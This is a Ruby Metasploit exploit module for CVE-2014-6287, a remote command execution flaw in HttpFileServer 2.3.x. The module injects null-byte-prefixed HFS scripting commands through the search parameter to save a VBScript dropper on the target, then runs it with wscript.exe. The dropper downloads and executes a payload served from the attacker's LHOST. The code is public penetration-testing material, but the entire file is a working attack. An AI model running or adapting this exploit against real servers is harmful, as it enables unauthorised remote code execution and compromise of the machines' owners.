##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Reank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "HttpFileServer 2.3.x Remote Command Execution",
      'Description'    => %q{
         HFS is vulnerable to remote command execution attack due to a poor regex in the file
         ParserLib.pas. This module exploit the HFS scripting commands by using '%00' to bypass
         the filtering.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Daniele Linguaglossa <danielelinguaglossa[at]gmail.com>', # orginal discovery
          'Muhamad Fadzil Ramli <mind1355[at]gmail.com>' # metasploit module
        ],
      'References'     =>
        [
          ['URL', 'http://seclists.org/bugtraq/2014/Sep/85'],
          ['URL', 'http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands'],
          ['CVE', '2014-6287'],
        ],
      'Payload'        => { 'BadChars' => "\x0d\x0a\x00" },
      # Tested HFS 2.3b on Microsoft Windows XP [Version 5.1.2600]
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', {} ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Sep 11 2014",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The path of the web application', '/']),
          OptString.new('SAVE_PATH', [true, 'Target writable path', 'c:\\']),
          OptInt.new('HTTPDELAY',    [false, 'Seconds to wait before terminating web server', 10]),
        ], self.class)
  end

  def check
    res = send_request_raw({
      'method' => 'GET',
      'uri'    => '/'
    })

    if res.headers['Server'] =~ /HFS 2\.3/
    # added proper regex as pointed by wchen
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end

  def on_request_uri(cli, req)
    print_status("#{peer} - Payload request received: #{req.uri}")
    exe = generate_payload_exe
    vbs = Msf::Util::EXE.to_exe_vbs(exe)
    send_response(cli, vbs, {'Content-Type' => 'application/octet-stream'})
    # remove resource after serving 1st request as 'exec' execute 4x
    # during exploitation
    remove_resource(get_resource)
  end

  def primer
    file_name = rand_text_alpha(rand(10)+5)
    file_ext = '.vbs'
    file_fullname = file_name + file_ext

    vbs_code = "Set x=CreateObject(\"Microsoft.XMLHTTP\")\x0d\x0aOn Error Resume Next\x0d\x0ax.Open \"GET\",\"http://#{datastore['LHOST']}:#{datastore['SRVPORT']}#{get_resource}\",False\x0d\x0aIf Err.Number <> 0 Then\x0d\x0awsh.exit\x0d\x0aEnd If\x0d\x0ax.Send\x0d\x0aExecute x.responseText"

    payloads = [
      "save|#{datastore['SAVE_PATH']}#{file_fullname}|#{vbs_code}",
      "exec|wscript.exe //B //NOLOGO #{datastore['SAVE_PATH']}#{file_fullname}",
      # using wscript.exe instead of cmd.exe, thank mubix
      #"delete|#{datastore['SAVE_PATH']}#{file_fullname}"
      # delete vbs file after execution
    ]

    print_status("Sending a malicious request to #{target_uri.path}")
    payloads.each { |payload|
      send_request_raw({
        'method' => 'GET',
        'uri'    => "/?search=%00{.#{URI::encode(payload)}.}"
     })
    }
    register_file_for_cleanup("#{datastore['SAVE_PATH']}#{file_fullname}")
    # use FileDropper method for cleanup
  end

  def exploit
    begin
      Timeout.timeout(datastore['HTTPDELAY']) { super }
      rescue Timeout::Error
      # When the server stops due to our timeout, this is raised
    end
  end
end
